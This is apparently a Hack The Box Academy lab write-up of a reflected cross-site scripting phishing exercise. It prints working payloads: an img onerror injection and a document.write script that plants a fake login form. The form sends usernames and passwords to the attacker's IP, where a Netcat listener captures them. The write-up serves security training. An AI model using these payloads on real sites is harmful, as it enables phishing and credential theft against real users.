# Hack The Box Academy - XSS Phishing Attack | Write-up

> **Platform:** Hack The Box Academy &nbsp;•&nbsp; **Category:** Cross-Site Scripting / Credential Harvesting
>
> **Author:** Jithin Jelson

---

The goal of this exercise was to use cross-site scripting on a vulnerable application to harvest user credentials via a phishing attack. This exercise was fairly straightforward and it was created with the assistance of the Cross-Site Scripting module on Hack The Box Academy.

- **Target IP:** `10.129.234.166`
- **My IP:** `10.10.14.88`

---

## What I Learned

- What inspect element shows you isn't always what you type in, the panel showed double quotes so I used double quotes and it failed, but when I used single quotes it worked and inspect then displayed them as double quotes anyway
- document.write() lets you inject your own login form, and remove() gets rid of the original one so it looks clean
- Because I was running on a Hack The Box pwnbox, something was already using port 80, which is probably why it wasn't free for my PHP script

---
## Attack Overview

```mermaid
flowchart TD
    A([Start]) --> B[Nmap scan]
    B --> C[phishing page]

    C --> D{XSS testing}
    D -->|script tag fails| E[Inspect element]
    D -->|img src found| F[Craft onerror payload]
    E --> F

    F --> G{Form injection}
    G --> H[document.write login form]
    G --> I[Remove urlform]
    H & I --> J[Phishing page live]

    J --> K{Harvest}
    K --> L[Netcat on port 8080]
    K --> M[Send via send.php]
    L & M --> N([Credentials captured])

    style A fill:#4a0080,color:#fff
    style N fill:#006400,color:#fff
    style D fill:#00008b,color:#fff
    style G fill:#00008b,color:#fff
    style K fill:#00008b,color:#fff
    style F fill:#8b0000,color:#fff
    style J fill:#8b4500,color:#fff
```
## Reconnaissance

First I ran an Nmap scan to see where our target website was being hosted and whether we could retrieve any further information for this exercise.

We found an HTTP port open on port 80, so we checked that out.

![Nmap scan results](images/01-nmap-scan.png)
*Figure 1 - Nmap scan showing port 80 open*

When I initially visited the site the homepage was empty. At this point I would attempt a directory enumeration and/or a subdomain enumeration using ffuf/gobuster, but the exercise told us the web page was under `/phishing` so we checked that out.

![The /phishing page](images/02-phishing-page.png)
*Figure 2 - The /phishing page*

---

## XSS Testing

Since we knew that this webpage was vulnerable to XSS, we tested the input field using a simple payload:

```html
<script>alert(1)</script>
```

When we entered the payload we got a broken image, which suggested the payload was unsuccessful. On closer inspection under the browser's developer tools I found a hint about what type of payload to use.

![Inspect element showing img src tag](images/03-inspect-element.png)
*Figure 3 - Inspect element showing the img src attribute*

We could see it was using an `<img src` tag, so we tested an alternative payload. After trying multiple payloads I found that the single quote helped me create the correct payload, and the final payload was:

```
x' onerror='alert(1)'
```

Which the site rendered as:

![XSS payload rendered](images/04-xss-payload-rendered.png)
*Figure 4 - XSS payload successfully rendered*

Now that we had our injection we can classify it as a **reflected XSS**, since the URL is the only thing that causes that error and it is not stored in a database to affect every user.

---

## Crafting the Phishing Form

Now we can add a `document.write()` function into our script which writes a login form for us:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://10.10.14.88><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>')
```

Now we can delete the image URL login box using the following:

![Login form alongside the original URL form](images/05-login-form-before-removal.png)
*Figure 5 - Login form alongside the original URL form before removal*

```javascript
;document.getElementById('urlform').remove();
```

So our final payload would be:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://10.10.14.88:8080><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

One mistake I made here, which I couldn't figure out for a while until I reached out for help via online tutorials, is that my `onerror` used single quotes on the outside and inside, therefore I had to use double quotes on the inside to avoid tricking the server and causing the browser to not understand the payload.

Finally our page was ready.

![Final phishing page](images/06-final-phishing-page.png)
*Figure 6 - Final phishing login page ready*

---

## Capturing Credentials

Now we can build a PHP script that logs the credentials from the HTTP request to us using Netcat as a listener.

![PHP listener script](images/07-php-script.png)
*Figure 7 - PHP script for logging credentials*

When we tried to run the PHP script we came across something already running on port 80.

![Port 80 conflict](images/08-port-conflict.png)
*Figure 8 - Something already running on port 80*

When we sent the link to `send.php` as the question asked we got a successful username and password.

![Credentials captured via Netcat](images/09-credentials-captured.png)
*Figure 9 - Successful credential capture*

![Final output](images/10-final.png)
*Figure 10 - Final output*
